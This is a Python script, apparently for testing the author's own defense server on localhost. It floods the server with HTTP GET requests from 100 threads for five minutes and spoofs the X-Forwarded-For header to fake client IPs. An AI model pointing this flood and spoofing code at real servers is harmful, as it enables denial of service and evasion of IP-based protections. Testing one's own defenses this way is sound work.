import requests
import random
import threading
import time
import socket

# Configuration
TARGET_URL = "http://localhost:5000"  # Your defense server URL
THREADS = 100                         # Concurrent attack threads 100
DURATION = 300                        # Attack duration (seconds) 300 - 5min

# Generate random IPs
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"



def get_local_ip():
    # Connect to a dummy address to get the local IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't actually send data
        s.connect(("8.8.8.8", 80))  # Google DNS
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"  # Fallback to localhost
    finally:
        s.close()
    return local_ip

# Attack function
def flood():
    while True:
        try:
                ip = "155.20.124.250"
                # print("Local IP:", get_local_ip())
                # ip = get_local_ip()  # Use local IP for spoofing
                # print(f"Attacking with IP: {ip}")

                TARGET_URL = "http://localhost:5000"  # Ensure this matches your server URL
                headers = {
                    "X-Forwarded-For": ip,  # Spoof IP in headers
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                response = requests.get(TARGET_URL, headers=headers)
                print(f"Sent request from {headers['X-Forwarded-For']} | Status: {response.status_code}")
        except Exception as e:
                print(f"Error: {e}")

iplist = ["196.237.80.180", "17.191.153.189", "168.34.35.252", "47.140.45.179", "107.206.89.63", \
          "196.237.80.180", "196.237.80.180", "196.237.80.180", "196.237.80.180", "196.237.80.180", \
            "196.237.80.180", "196.237.80.180"]  # Placeholder for IPs
# Start attack threads
threads = []
for _ in range(THREADS):
    t = threading.Thread(target=flood)
    t.daemon = True
    threads.append(t)
    t.start()

# Run for specified duration
time.sleep(DURATION)
print("Attack simulation completed.")